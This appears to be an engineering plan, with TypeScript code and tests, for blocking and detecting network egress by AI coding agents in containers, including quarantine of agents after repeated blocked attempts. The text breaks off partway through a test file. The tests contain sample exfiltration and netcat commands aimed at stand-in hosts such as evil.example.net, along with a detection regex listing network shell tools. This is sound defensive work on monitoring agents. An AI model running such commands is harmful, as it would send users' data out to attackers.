# WS-B: Runtime Egress Enforcement Implementation Plan

> ## ⛔ STOP — read [REVIEW-2026-08-30.md](REVIEW-2026-08-30.md) before executing
>
> - **`--network none` will brick every run.** `grants` is now always `[]` (nothing seeds it), so `hasEgressGrants` is always `false`, so every container loses networking — and the Codex CLI inside it reaches the model API through `host.docker.internal` (`config.ts:76`). Seed a standing `network:egress` grant for the model-API host at agent creation AND gate `--network none` behind an explicit config flag. Delete the dead `undefined`-grants branch and its Task 5 test.
> - **The "fail closed / blocked before execution" claim is false.** `onStep` fires on `item.completed` — the command has already run inside the container (its detail even carries `(exit N)`). This is post-hoc detection, and any agent with one grant still has unrestricted bridge networking. Either implement the real proxy, or reword honestly ("violation detected; run failed closed") — a judge reading the code will find this.
> - `host: null` matches (`git fetch`, `npm install node-fetch`) must fall through to HITL approval, not hard-deny + quarantine; exclude `message` steps from strike counting; extract **all** hosts, not just the first (`curl allowed.com evil.net` currently passes).

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Default-deny network egress at the runtime boundary: intercept runner steps that target a network host, evaluate them against `network:egress` grants, block fail-closed, quarantine the agent after 3 blocked attempts in one run, and cut container networking entirely (`--network none`) for agents with zero egress grants.

**Architecture:** A new pure module `egress-guard.ts` extracts target hosts from `RunnerStepEvent` text (reusing the SEC-EGRESS-003 regex approach) and evaluates them via WS-A's `evaluateEgress` (consumed by spec signature, never re-implemented; a fail-closed deny-all fallback stands in until WS-A's export lands). `AgentService.executeRun`'s `onStep` callback wires the guard in ahead of the existing HITL risk gate, persisting `policy.decision` + `egress.blocked` `RunEvent`s and throwing `RunPolicyViolationError("egress", 403, …)` fail-closed. `ContainerCodexRunner.buildContainerRunArgs` swaps `--network bridge` for `--network none` when the run's agent has zero active egress grants.

**Tech Stack:** TypeScript (ESM, `.js` import specifiers), Fastify server workspace `@launchpad/server`, Vitest 4, zod config schema, Docker/Podman container runner.

**Spec:** `docs/superpowers/specs/2026-08-30-agent-passport-design.md` (this plan implements Workstream B only).

## Global Constraints

- Contracts are frozen: `Grant`, `GrantScope`, `PolicyDecision`, `evaluateEgress` signature, and `RunEventType` additions are copied **verbatim** from the spec's "Shared contracts" section. Never rename or reshape them.
- `evaluateEgress` belongs to WS-A. Consume its spec signature; **do not implement its grant logic in production code**. Tests that need it before WS-A lands use a minimal stub in the test file, clearly marked for deletion.
- Failure semantics (spec "Failure semantics"): egress deny → step blocked before execution (fail closed), `egress.blocked` + `policy.decision` events; repeated attempts (≥3 in one run) escalate to quarantine via the existing stop path (`agent.status = "stopped"`).
- Every policy decision (allow AND deny) is persisted as a `RunEvent` of type `policy.decision` with `detail` = JSON of the `PolicyDecision`.
- No caching of decisions: grants are re-read from the store on every step so mid-run revocation/expiry takes effect.
- Baseline preserved: `npm run check` (root: typecheck + test + build) stays green. Runs with no egress-shaped steps behave exactly as before.
- All server imports use the `./name.js` ESM specifier convention. Tests live next to sources as `apps/server/src/*.test.ts` and run with `npm test` inside `apps/server`.
- Commit after every task. All paths below are relative to `/Users/zhuzhenzhuo/Projects/CodeJam` unless absolute.

**Risk note (read before Task 6):** the codex CLI inside the container calls the model API over the network. `--network none` therefore means a zero-grant agent cannot complete any run — that is the intended zero-trust demo behavior ("no network it wasn't given"). Two guards keep the baseline working: (1) when the store has **no grants table at all** (WS-A migration not yet applied) the flag is `undefined` and networking stays on `bridge`; (2) once WS-A lands, demo/seed flows must grant each runnable agent `network:egress` to the model-API host (e.g. `openrouter.ai` or `host.docker.internal` in Gemini-adapter mode). Flag this to WS-A's owner when both branches merge.

---

### Task 1: Shared contract types

**Files:**
- Modify: `apps/server/src/types.ts` (add `GrantScope`, `Grant`, `PolicyDecision`; extend `RunEventType`; extend `RunnerRequest`)
- Modify: `apps/server/src/run-policies.ts:5` (extend `RunPolicyKind`)

**Interfaces:**
- Consumes: nothing (first task).
- Produces: `Grant`, `GrantScope`, `PolicyDecision` exported from `types.ts`; `RunEventType` includes `"policy.decision"` and `"egress.blocked"`; `RunnerRequest.hasEgressGrants?: boolean | undefined`; `RunPolicyKind` includes `"egress"`. Every later task imports these.

WS-A owns `types.ts` too, so these additions may already exist when you start. For each snippet below: **if the identical declaration is already present, skip it** — the text is contract-identical by design, so a later merge with WS-A resolves to the same code.

- [ ] **Step 1: Add grant/decision types to `apps/server/src/types.ts`**

Append after the `RunnerRequest`/`AgentRunner` block (end of file), verbatim from the spec:

```ts
export type GrantScope = "resource:read" | "resource:write" | "network:egress";

export interface Grant {
  id: string;
  principalId: string;     // agent principal receiving the grant
  grantedBy: string;       // human principal id
  scope: GrantScope;
  target: string;          // resourceId for resource:*, hostname for network:egress
  expiresAt: string | null; // ISO; null = no expiry
  revokedAt: string | null;
  createdAt: string;
}

export interface PolicyDecision {
  allowed: boolean;
  ruleId: string;          // e.g. "AUTHZ-OWNER-010", "AUTHZ-GRANT-011", "NET-EGRESS-020"
  reason: string;
  principalId: string | null;
  grantId: string | null;
}
```

- [ ] **Step 2: Extend `RunEventType` in `apps/server/src/types.ts`**

In the `RunEventType` union (currently ends with `| "step.approval_denied";` around line 60), add two members (WS-B only emits these two; other spec event types belong to other workstreams):

```ts
  | "step.approval_denied"
  | "policy.decision"
  | "egress.blocked";
```

- [ ] **Step 3: Extend `RunnerRequest` in `apps/server/src/types.ts`**

Add one optional field to the existing `RunnerRequest` interface (matching the file's `| undefined` optional style):

```ts
export interface RunnerRequest {
  agentId: string;
  sessionId?: string | null | undefined;
  workspacePath: string;
  prompt: string;
  threadId: string | null;
  onStep?: ((step: RunnerStepEvent) => Promise<void> | void) | undefined;
  /**
   * WS-B container hardening. true = agent has >=1 active network:egress
   * grant; false = grants table exists and agent has zero -> runner must
   * isolate networking; undefined = grants table absent (pre-WS-A store),
   * keep legacy bridge networking.
   */
  hasEgressGrants?: boolean | undefined;
}
```

- [ ] **Step 4: Extend `RunPolicyKind` in `apps/server/src/run-policies.ts`**

Change line 5 from:

```ts
export type RunPolicyKind = "canary" | "budget" | "approval";
```

to:

```ts
export type RunPolicyKind = "canary" | "budget" | "approval" | "egress";
```

(WS-A adds `"authz" | "anomaly"` to the same union; a merge conflict here resolves to the union of both lists.)

- [ ] **Step 5: Verify typecheck and existing tests still pass**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npm run typecheck && npm test`
Expected: typecheck clean, all existing tests PASS (pure type additions).

- [ ] **Step 6: Commit**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam
git add apps/server/src/types.ts apps/server/src/run-policies.ts
git commit -m "feat(governance): add WS-B shared contract types (Grant, PolicyDecision, egress events)"
```

---

### Task 2: Egress target extraction (`extractEgressTarget`)

**Files:**
- Create: `apps/server/src/egress-guard.ts`
- Create: `apps/server/src/egress-guard.test.ts`

**Interfaces:**
- Consumes: `RunnerStepEvent` from `./types.js` (Task 1 file, field `type/title/detail/rawPayload` — pre-existing).
- Produces: `interface EgressTarget { matched: boolean; host: string | null }` and `function extractEgressTarget(step: RunnerStepEvent): EgressTarget`, both exported from `egress-guard.ts`. Task 3 builds `EgressGuard` on top of them.

Extraction reuses the SEC-EGRESS-003 detection approach from `run-policies.ts:53-63` (same tool word-list, same URL detection, same concatenated `title + detail + JSON(rawPayload)` text), but additionally captures the target host. Semantics:

- `matched: false, host: null` — step has no egress signal at all.
- `matched: true, host: "example.com"` — egress signal with a resolvable host (lowercased, port stripped).
- `matched: true, host: null` — an egress tool appears but no host could be parsed (e.g. `curl $TARGET`). Task 3 treats this as fail-closed deny. Known tradeoff, accepted deliberately: `fetch`/`nc` word matches inherit SEC-EGRESS-003's false-positive surface (e.g. `git fetch`), which today already forces HITL approval for the same text — behavior stays consistent with the existing rule.

- [ ] **Step 1: Write the failing tests**

Create `apps/server/src/egress-guard.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { extractEgressTarget } from "./egress-guard.js";
import type { RunnerStepEvent } from "./types.js";

function step(detail: string, rawPayload: unknown = null): RunnerStepEvent {
  return { type: "command", title: "shell", detail, rawPayload };
}

describe("extractEgressTarget", () => {
  it("extracts the host from an http(s) URL", () => {
    expect(extractEgressTarget(step("curl https://api.example.com/v1/data"))).toEqual({
      matched: true,
      host: "api.example.com",
    });
  });

  it("lowercases the host and strips the port", () => {
    expect(extractEgressTarget(step("wget http://EVIL.Example.com:8080/payload"))).toEqual({
      matched: true,
      host: "evil.example.com",
    });
  });

  it("extracts user@host targets from ssh-style commands", () => {
    expect(extractEgressTarget(step("ssh deploy@build.internal.example.com uptime"))).toEqual({
      matched: true,
      host: "build.internal.example.com",
    });
  });

  it("extracts bare IPv4 targets from netcat-style commands", () => {
    expect(extractEgressTarget(step("nc 203.0.113.7 4444"))).toEqual({
      matched: true,
      host: "203.0.113.7",
    });
  });

  it("finds hosts inside the raw payload JSON", () => {
    expect(
      extractEgressTarget(step("tool call", { url: "https://exfil.example.net/upload" })),
    ).toEqual({ matched: true, host: "exfil.example.net" });
  });

  it("flags egress tools without a resolvable host as matched with null host", () => {
    expect(extractEgressTarget(step("curl $TARGET"))).toEqual({ matched: true, host: null });
  });

  it("ignores steps with no egress signal", () => {
    expect(extractEgressTarget(step("ls -la src/ && cat README.md"))).toEqual({
      matched: false,
      host: null,
    });
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/egress-guard.test.ts`
Expected: FAIL — cannot resolve `./egress-guard.js` (module does not exist yet).

- [ ] **Step 3: Implement extraction in `apps/server/src/egress-guard.ts`**

```ts
import type { RunnerStepEvent } from "./types.js";

/**
 * WS-B: runtime egress enforcement (spec: 2026-08-30-agent-passport-design.md).
 * Extraction reuses the SEC-EGRESS-003 detection approach from run-policies.ts
 * (same tool list, same URL signal, same title+detail+rawPayload text) but
 * additionally captures the target host for grant evaluation.
 */

export interface EgressTarget {
  matched: boolean;      // any egress signal in the step text
  host: string | null;   // resolvable target host, or null if unparseable
}

// Same tool word-list as SEC-EGRESS-003 in run-policies.ts.
const EGRESS_TOOL_PATTERN =
  /\b(?:curl|wget|fetch|nc|netcat|ncat|telnet|ssh|scp|rsync|socat)\b/i;

// https://user@host:port/... -> capture host
const URL_HOST_PATTERN =
  /https?:\/\/(?:[^\s"'/@]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*)(?::\d+)?/i;

// "<tool> [flags] [user@]host" where host is dotted-name or IPv4.
const TOOL_TARGET_PATTERN =
  /\b(?:curl|wget|nc|netcat|ncat|telnet|ssh|scp|rsync|socat)\b[^|;&\n]*?\s(?:[a-zA-Z0-9._-]+@)?((?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+)/i;

function stepText(step: RunnerStepEvent): string {
  return `${step.title} ${step.detail} ${JSON.stringify(step.rawPayload ?? "")}`;
}

function normalizeHost(raw: string): string {
  return raw.replace(/:\d+$/, "").replace(/\.$/, "").toLowerCase();
}

export function extractEgressTarget(step: RunnerStepEvent): EgressTarget {
  const text = stepText(step);
  const urlMatch = URL_HOST_PATTERN.exec(text);
  if (urlMatch?.[1]) {
    return { matched: true, host: normalizeHost(urlMatch[1]) };
  }
  const toolTargetMatch = TOOL_TARGET_PATTERN.exec(text);
  if (toolTargetMatch?.[1]) {
    return { matched: true, host: normalizeHost(toolTargetMatch[1]) };
  }
  if (EGRESS_TOOL_PATTERN.test(text)) {
    // Egress tool detected but target not parseable -> caller must fail closed.
    return { matched: true, host: null };
  }
  return { matched: false, host: null };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/egress-guard.test.ts`
Expected: PASS (7 tests).

- [ ] **Step 5: Commit**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam
git add apps/server/src/egress-guard.ts apps/server/src/egress-guard.test.ts
git commit -m "feat(governance): extract egress target hosts from runner steps"
```

---

### Task 3: `EgressGuard` — decisions, counting, quarantine

**Files:**
- Modify: `apps/server/src/egress-guard.ts`
- Modify: `apps/server/src/egress-guard.test.ts`

**Interfaces:**
- Consumes: `extractEgressTarget` + `EgressTarget` (Task 2); `Grant`, `PolicyDecision`, `RunnerStepEvent` from `./types.js` (Task 1); `RunPolicyViolationError` from `./run-policies.js` (pre-existing, now accepts kind `"egress"`).
- Produces (all exported from `egress-guard.ts`; Task 5 consumes every one):
  - `type EgressEvaluator = (agentPrincipalId: string, host: string, grants: Grant[], nowIso: string) => PolicyDecision`
  - `const DEFAULT_EGRESS_QUARANTINE_THRESHOLD = 3`
  - `class EgressQuarantineError extends RunPolicyViolationError` — `constructor(attempts: number, hosts: string[])`, kind `"egress"`, status 403.
  - `interface EgressEvaluation { target: EgressTarget; decision: PolicyDecision | null }`
  - `class EgressGuard` — `constructor(agentPrincipalId: string, grantsProvider: () => Grant[], quarantineThreshold?: number, evaluator?: EgressEvaluator)`; `evaluateStep(step: RunnerStepEvent, nowIso: string): EgressEvaluation`; getters `blockedAttempts: number`, `blockedHosts: string[]`, `shouldQuarantine: boolean`.
  - `function hasActiveEgressGrants(agentPrincipalId: string, grants: Grant[], nowIso: string): boolean` (used by Task 6 container hardening).

Key decisions locked in here:

- `evaluateEgress` is **not implemented** in this workstream. `EgressGuard` resolves it at construction time from `run-policies.ts` via a namespace import; if WS-A's export is not yet present, a deny-everything fallback (`NET-EGRESS-020`, "evaluator unavailable") keeps semantics fail-closed. When WS-A merges, the real implementation is picked up with zero code change.
- Grants come from a **provider function** called on every step — spec forbids caching so mid-run revocation/expiry is honored.
- A matched step with `host: null` is denied without calling the evaluator (there is no host to grant), using the same `NET-EGRESS-020` default-deny rule id.

- [ ] **Step 1: Write the failing tests**

Append to `apps/server/src/egress-guard.test.ts` (extend the import at the top of the file to `import { EgressGuard, EgressQuarantineError, extractEgressTarget, hasActiveEgressGrants, type EgressEvaluator } from "./egress-guard.js";` and add `import type { Grant } from "./types.js";`):

```ts
// --- WS-A stub -------------------------------------------------------------
// Minimal local stand-in for WS-A's evaluateEgress (rule NET-EGRESS-020:
// default deny; allow only hosts with an active network:egress grant).
// Tests inject it explicitly; DELETE once WS-A's real export exists and
// switch these tests to import { evaluateEgress } from "./run-policies.js".
const stubEvaluateEgress: EgressEvaluator = (agentPrincipalId, host, grants, nowIso) => {
  const grant = grants.find(
    (item) =>
      item.principalId === agentPrincipalId &&
      item.scope === "network:egress" &&
      item.target === host &&
      item.revokedAt === null &&
      (item.expiresAt === null || item.expiresAt > nowIso),
  );
  return grant
    ? {
        allowed: true,
        ruleId: "NET-EGRESS-020",
        reason: "Active network:egress grant for " + host,
        principalId: agentPrincipalId,
        grantId: grant.id,
      }
    : {
        allowed: false,
        ruleId: "NET-EGRESS-020",
        reason: "Default deny: no active network:egress grant for " + host,
        principalId: agentPrincipalId,
        grantId: null,
      };
};
// ---------------------------------------------------------------------------

const NOW = "2026-08-30T12:00:00.000Z";

function makeGrant(overrides: Partial<Grant> = {}): Grant {
  return {
    id: "grant-1",
    principalId: "agent-a1",
    grantedBy: "user-a",
    scope: "network:egress",
    target: "api.example.com",
    expiresAt: null,
    revokedAt: null,
    createdAt: "2026-08-30T00:00:00.000Z",
    ...overrides,
  };
}

function makeGuard(grants: Grant[], threshold = 3): EgressGuard {
  return new EgressGuard("agent-a1", () => grants, threshold, stubEvaluateEgress);
}

describe("EgressGuard", () => {
  it("lets an allowlisted host pass without counting an attempt", () => {
    const guard = makeGuard([makeGrant()]);
    const evaluation = guard.evaluateStep(step("curl https://api.example.com/data"), NOW);
    expect(evaluation.decision).toMatchObject({ allowed: true, ruleId: "NET-EGRESS-020" });
    expect(guard.blockedAttempts).toBe(0);
    expect(guard.shouldQuarantine).toBe(false);
  });

  it("returns a null decision for non-network steps", () => {
    const guard = makeGuard([makeGrant()]);
    expect(guard.evaluateStep(step("npm run typecheck"), NOW).decision).toBeNull();
    expect(guard.blockedAttempts).toBe(0);
  });

  it("denies a non-allowlisted host and counts the attempt", () => {
    const guard = makeGuard([makeGrant()]);
    const evaluation = guard.evaluateStep(step("curl https://evil.example.net/x"), NOW);
    expect(evaluation.decision).toMatchObject({ allowed: false, ruleId: "NET-EGRESS-020" });
    expect(guard.blockedAttempts).toBe(1);
    expect(guard.blockedHosts).toEqual(["evil.example.net"]);
  });

  it("denies fail-closed when an egress tool has no resolvable host", () => {
    const guard = makeGuard([makeGrant()]);
    const evaluation = guard.evaluateStep(step("curl $TARGET"), NOW);
    expect(evaluation.decision).toMatchObject({ allowed: false, ruleId: "NET-EGRESS-020" });
    expect(guard.blockedHosts).toEqual(["<unresolved>"]);
  });

  it("re-reads grants on every step so mid-run revocation takes effect", () => {
    const grants = [makeGrant()];
    const guard = new EgressGuard("agent-a1", () => grants, 3, stubEvaluateEgress);
    expect(guard.evaluateStep(step("curl https://api.example.com/a"), NOW).decision?.allowed).toBe(true);
    grants[0] = makeGrant({ revokedAt: NOW });
    expect(guard.evaluateStep(step("curl https://api.example.com/b"), NOW).decision?.allowed).toBe(false);
  });

  it("signals quarantine at the configured threshold", () => {
    const guard = makeGuard([]);
    guard.evaluateStep(step("curl https://one.example.net"), NOW);
    guard.evaluateStep(step("curl https://two.example.net"), NOW);
    expect(guard.shouldQuarantine).toBe(false);
    guard.evaluateStep(step("curl https://three.example.net"), NOW);
    expect(guard.blockedAttempts).toBe(3);
    expect(guard.shouldQuarantine).toBe(true);
  });
});

describe("EgressQuarantineError", () => {
  it("is an egress policy violation with HTTP 403", () => {
    const error = new EgressQuarantineError(3, ["a.example.net", "b.example.net"]);
    expect(error.kind).toBe("egress");
    expect(error.statusCode).toBe(403);
    expect(error.message).toContain("quarantine");
    expect(error.message).toContain("a.example.net");
  });
});

describe("hasActiveEgressGrants", () => {
  it("is true only for an unexpired, unrevoked network:egress grant of the principal", () => {
    expect(hasActiveEgressGrants("agent-a1", [makeGrant()], NOW)).toBe(true);
    expect(hasActiveEgressGrants("agent-a1", [], NOW)).toBe(false);
    expect(hasActiveEgressGrants("agent-other", [makeGrant()], NOW)).toBe(false);
    expect(hasActiveEgressGrants("agent-a1", [makeGrant({ revokedAt: NOW })], NOW)).toBe(false);
    expect(
      hasActiveEgressGrants("agent-a1", [makeGrant({ expiresAt: "2026-08-30T11:59:59.000Z" })], NOW),
    ).toBe(false);
    expect(
      hasActiveEgressGrants("agent-a1", [makeGrant({ scope: "resource:read" })], NOW),
    ).toBe(false);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/egress-guard.test.ts`
Expected: FAIL — `EgressGuard`, `EgressQuarantineError`, `hasActiveEgressGrants` not exported.

- [ ] **Step 3: Implement the guard in `apps/server/src/egress-guard.ts`**

Add to the imports at the top of the file:

```ts
import * as runPolicies from "./run-policies.js";
import { RunPolicyViolationError } from "./run-policies.js";
import type { Grant, PolicyDecision } from "./types.js";
```

Append below `extractEgressTarget`:

```ts
export const DEFAULT_EGRESS_QUARANTINE_THRESHOLD = 3;

const UNRESOLVED_HOST = "<unresolved>";

/** Spec signature of WS-A's evaluateEgress (run-policies.ts). */
export type EgressEvaluator = (
  agentPrincipalId: string,
  host: string,
  grants: Grant[],
  nowIso: string,
) => PolicyDecision;

/**
 * WS-A provides evaluateEgress in run-policies.ts. Until that export lands,
 * fall back to an unconditional NET-EGRESS-020 deny so enforcement stays
 * fail-closed. Once WS-A merges, this resolves to the real implementation
 * automatically; the fallback branch then becomes dead code and may be
 * simplified to a direct import.
 */
function resolveEvaluateEgress(): EgressEvaluator {
  const candidate = (runPolicies as Record<string, unknown>)["evaluateEgress"];
  if (typeof candidate === "function") {
    return candidate as EgressEvaluator;
  }
  return (agentPrincipalId, host) => ({
    allowed: false,
    ruleId: "NET-EGRESS-020",
    reason:
      "Egress evaluator unavailable; default deny (fail closed) for host " + host,
    principalId: agentPrincipalId,
    grantId: null,
  });
}

export class EgressQuarantineError extends RunPolicyViolationError {
  constructor(attempts: number, hosts: string[]) {
    super(
      "egress",
      403,
      "Egress quarantine: " +
        attempts +
        " blocked egress attempts in one run (hosts: " +
        hosts.join(", ") +
        "). Agent stopped fail-closed.",
    );
  }
}

export interface EgressEvaluation {
  target: EgressTarget;
  decision: PolicyDecision | null; // null when the step has no egress signal
}

export function hasActiveEgressGrants(
  agentPrincipalId: string,
  grants: Grant[],
  nowIso: string,
): boolean {
  return grants.some(
    (grant) =>
      grant.principalId === agentPrincipalId &&
      grant.scope === "network:egress" &&
      grant.revokedAt === null &&
      (grant.expiresAt === null || grant.expiresAt > nowIso),
  );
}

export class EgressGuard {
  private blocked = 0;
  private readonly hosts: string[] = [];

  constructor(
    private readonly agentPrincipalId: string,
    private readonly grantsProvider: () => Grant[],
    private readonly quarantineThreshold: number = DEFAULT_EGRESS_QUARANTINE_THRESHOLD,
    private readonly evaluator: EgressEvaluator = resolveEvaluateEgress(),
  ) {}

  get blockedAttempts(): number {
    return this.blocked;
  }

  get blockedHosts(): string[] {
    return [...this.hosts];
  }

  get shouldQuarantine(): boolean {
    return this.blocked >= this.quarantineThreshold;
  }

  evaluateStep(step: RunnerStepEvent, nowIso: string): EgressEvaluation {
    const target = extractEgressTarget(step);
    if (!target.matched) {
      return { target, decision: null };
    }
    const decision: PolicyDecision =
      target.host === null
        ? {
            allowed: false,
            ruleId: "NET-EGRESS-020",
            reason:
              "Egress tool detected without a resolvable target host; default deny (fail closed).",
            principalId: this.agentPrincipalId,
            grantId: null,
          }
        : this.evaluator(
            this.agentPrincipalId,
            target.host,
            this.grantsProvider(),
            nowIso,
          );
    if (!decision.allowed) {
      this.blocked += 1;
      this.hosts.push(target.host ?? UNRESOLVED_HOST);
    }
    return { target, decision };
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/zhuzhenzhuo/Projects/CodeJam/apps/server && npx vitest run src/egress-guard.test.ts`
Expected: PASS (15 tests: 7 extraction + 8 new). Also run `npm run typecheck` — clean.

- [ ] **Step 5: Commit**

```bash
cd /Users/zhuzhenzhuo/Projects/CodeJam
git add apps/server/src/egress-guard.ts apps/server/src/egress-guard.test.ts
git commit -m "feat(governance): EgressGuard with fail-closed decisions and quarantine counting"
```

---

### Task 4: Wire the guard into `AgentService.executeRun`

**Files:**
- Modify: `apps/server/src/config.ts:52-58` (env schema) and `:116-121` (return object)
- Modify: `apps/server/src/agent-service.ts:22-31` (imports), `:496-540` (onStep), `:671-708` (catch path)
- Create: `apps/server/src/agent-service.egress.test.ts`

**Interfaces:**
- Consumes: `EgressGuard`, `EgressQuarantineError` from `./egress-guard.js` (Task 3, exact signatures listed there); `Grant` from `./types.js` (Task 1); `RunPolicyViolationError` (kind `"egress"`, Task 1); existing `appendRunEvent`/`redact`/`pendingApprovals` machinery in `agent-service.ts`.
- Produces: `AppConfig.egressQuarantineThreshold: number` (default 3, env `EGRESS_QUARANTINE_THRESHOLD`); run traces containing `policy.decision` and `egress.blocked` events; run-failure semantics — 1–2 blocked attempts → run `failed` + `run.blocked` event, agent back to `"ready"`; ≥3 → `EgressQuarantineError` thrown, runner cancelled, agent `"stopped"` (existing stop path). Task 5 relies on the config field name and on the store possibly lacking a `grants` table.

Behavior contract for `onStep` ordering (canary tripwire stays first, egress second, HITL risk gate third):

- Allowed egress decision → persist `policy.decision` (severity `info`), then fall through to the existing risk gate unchanged (grants gate policy; HITL stays as defense in depth — SEC-EGRESS-003 still requests approval for the same step).
- Denied egress decision → persist `policy.decision` (severity `warning`) + `egress.blocked`, then **block the step fail-closed**: skip the HITL gate and step recording entirely (`return`), and remember a `RunPolicyViolationError("egress", 403, …)` in the existing `stepViolation` slot so the run can never report success. At `>= egressQuarantineThreshold` blocked attempts, throw `EgressQuarantineError` from `onStep` (same propagation path the approval-denial throw already uses) after cancelling the runner.
- Grants are read through a provider from a live store snapshot on every step (no caching). Pre-WS-A stores have no `grants` array — the cast-with-fallback reads `undefined` → `[]` → everything denied fail-closed.

- [ ] **Step 1: Write the failing tests**

Create `apps/server/src/agent-service.egress.test.ts`:

```ts
import { mkdtemp } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { afterEach, describe, expect, it, vi } from "vitest";

import { AgentService } from "./agent-service.js";
import { loadConfig } from "./config.js";
import { JsonStore } from "./store.js";
import type {
  AgentRunner,
  Grant,
  RunnerRequest,
  RunnerResult,
  RunnerStepEvent,
} from "./types.js";
import { WorkspaceManager } from "./workspace.js";

// --- WS-A stub -------------------------------------------------------------
// run-policies.ts does not export evaluateEgress until Workstream A lands.
// This partial mock adds a spec-conformant NET-EGRESS-020 stub ONLY when the
// real export is missing (post-merge it returns the actual module untouched).
// DELETE this vi.mock block once WS-A has merged.
vi.mock("./run-policies.js", async (importOriginal) => {
  const actual = await importOriginal<Record<string, unknown>>();
  if (typeof actual["evaluateEgress"] === "function") {
    return actual;
  }
  const evaluateEgress = (
    agentPrincipalId: string,
    host: string,
    grants: Grant[],
    nowIso: string,
  ) => {
    const grant = grants.find(
      (item) =>
        item.principalId === agentPrincipalId &&
        item.scope === "network:egress" &&
        item.target === host &&
        item.revokedAt === null &&
        (item.expiresAt === null || item.expiresAt > nowIso),
    );
    return grant
      ? {
          allowed: true,
          ruleId: "NET-EGRESS-020",
          reason: "Active network:egress grant for " + host,
          principalId: agentPrincipalId,
          grantId: grant.id,
        }
      : {
          allowed: false,
          ruleId: "NET-EGRESS-020",
          reason: "Default deny: no active network:egress grant for " + host,
          principalId: agentPrincipalId,
          grantId: null,
        };
  };
  return { ...actual, evaluateEgress };
});
// ---------------------------------------------------------------------------

class StepRunner implements AgentRunner {
  public lastRequest: RunnerRequest | null = null;
  constructor(private readonly steps: RunnerStepEvent[]) {}
  async run(request: RunnerRequest): Promise<RunnerResult> {
    this.lastRequest = request;
    for (const step of this.steps) {
      await request.onStep?.(step);
    }
    return { output: "runner finished", threadId: "thread-egress", usage: null };
  }
  async cancel(): Promise<boolean> {
    return true;
  }
  async isAvailable(): Promise<boolean> {
    return true;
  }
}

function commandStep(detail: string): RunnerStepEvent {
  return { type: "command", title: "shell", detail, rawPayload: null };
}

const temporaryDirectories: string[] = [];

afterEach(async () => {
  const { rm } = await import("node:fs/promises");
  await Promise.all(
    temporaryDirectories
      .splice(0)
      .map((directory) => rm(directory, { recursive: true, force: true })),
  );
});

async function makeService(
  runner: AgentRunner,
): Promise<{ service: AgentService; store: JsonStore }> {
  const root = await mkdtemp(path.join(tmpdir(), "launchpad-egress-test-"));
  temporaryDirectories.push(root);
  const config = loadConfig({
    NODE_ENV: "test",
    APP_DATA_DIR: path.join(root, "data"),
    AGENT_WORKSPACE_ROOT: path.join(root, "workspaces"),
    CODEX_HOME: path.join(root, "codex"),
    OPENROUTER_API_KEY: "test-key",
    OPENROUTER_MODEL: "openrouter/test-model",
  });
  const store = new JsonStore(path.join(root, "data", "db.json"));
  const service = new AgentService(
    config,
    store,
    new WorkspaceManager(path.join(root, "workspaces")),
    runner,
  );
  await service.initialize();
  return { service, store };
}

function egressGrantFor(agentId: string): Grant {
  return {
    id: "grant-egress-1",
    principalId: "agent-" + agentId,
    grantedBy: "user-a",
    scope: "network:egress",
    target: "api.example.com",
    expiresAt: null,
    revokedAt: null,
    createdAt: new Date().toISOString(),
  };
}

async function seedGrants(store: JsonStore, grants: Grant[]): Promise<void> {
  // WS-A owns the Database.grants migration; until it lands the extra key is
  // written through a cast (JSON store round-trips unknown keys fine).
  await store.mutate((database) => {
    (database as unknown as { grants: Grant[] }).grants = grants;
  });
}

describe("egress quarantine threshold config", () => {
  it("defaults EGRESS_QUARANTINE_THRESHOLD to 3", () => {
    expect(loadConfig({ NODE_ENV: "test" }).egressQuarantineThreshold).toBe(3);
  });
});

describe("egress enforcement in executeRun", () => {
  it("blocks a non-allowlisted host fail-closed and records the trace", async () => {
    const runner = new StepRunner([commandStep("curl https://evil.example.net/exfil")]);
    const { service } = await makeService(runner);
    const agent = await service.createAgent({ name: "Blocked" });
    const { run } = await service.sendMessage(agent.id, "fetch the report");

    await expect.poll(() => service.getRun(run.id).status).toBe("failed");
    expect(service.getRun(run.id).error).toContain("NET-EGRESS-020");
    // One blocked attempt is NOT quarantine: agent returns to ready.
    await expect.poll(() => service.getAgent(agent.id).status).toBe("ready");

    const events = service.getRunEvents(run.id);
    const types = events.map((event) => event.type);
    expect(types).toContain("policy.decision");
    expect(types).toContain("egress.blocked");
    expect(types).toContain("run.blocked");
    expect(types).not.toContain("step.command"); // step was blocked, not recorded
    const decisionEvent = events.find((event) => event.type === "policy.decision");
    expect(JSON.parse(decisionEvent?.detail ?? "{}")).toMatchObject({
      allowed: false,
      ruleId: "NET-EGRESS-020",
      principalId: "agent-" + agent.id,
    });
  });

  it("quarantines the agent after 3 blocked attempts in one run", async () => {
    const runner = new StepRunner([
      commandStep("curl https://one.example.net/a"),
      commandStep("curl https://two.example.net/b"),
      commandStep("curl https://three.example.net/c"),
      commandStep("echo never-reached"),
    ]);
    const { service } = await makeService(runner);
    const agent = await service.createAgent({ name: "Quarantined" });
    const { run } = await service.sendMessage(agent.id, "exfiltrate");

    await expect.poll(() => service.getRun(run.id).status).toBe("failed");
    expect(service.getRun(run.id).error).toContain("Egress quarantine");
    // Existing stop path: policy violation leaves the agent stopped.
    await expect.poll(() => service.getAgent(agent.id).status).toBe("stopped");

    const events = service.getRunEvents(run.id);
    expect(events.filter((event) => event.type === "egress.blocked")).toHaveLength(3);
    expect(events.filter((event) => event.type === "policy.decision")).toHaveLength(3);
    expect(
      events.find((event) => event.type === "run.blocked")?.title,
    ).toContain("quarantined");
  });

